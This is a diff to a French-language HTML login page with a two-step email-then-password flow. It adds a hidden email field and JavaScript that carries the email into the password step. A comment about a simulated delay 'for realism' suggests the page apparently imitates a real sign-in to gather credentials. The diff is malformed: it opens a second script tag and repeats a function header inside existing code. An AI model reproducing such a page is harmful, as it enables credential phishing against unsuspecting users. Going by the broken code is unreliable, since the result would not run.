@@ -154,6 +154,7 @@
             <!-- ÉTAPE 2 : MOT DE PASSE -->
             <div id="step2" class="step">
                 <form action="/login" method="POST">
+    <input type="hidden" name="email" id="hidden_email">
                     <div class="input-group">
                         <label for="password">Mot de passe</label>
                         <input type="password" id="password" name="password" placeholder="Votre mot de passe" required>
@@ -188,6 +189,18 @@
             document.getElementById('loader').style.display = 'block';
             
             // Simulation d'un petit délai pour le réalisme (1 seconde)
+                <script>
+        function goToStep2(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            
+            // On sauvegarde l'email dans le champ caché de l'étape 2
+            document.getElementById('hidden_email').value = email;
+            
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('loader').style.display = 'block';
+            
             setTimeout(function() {
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('step2').classList.add('active');
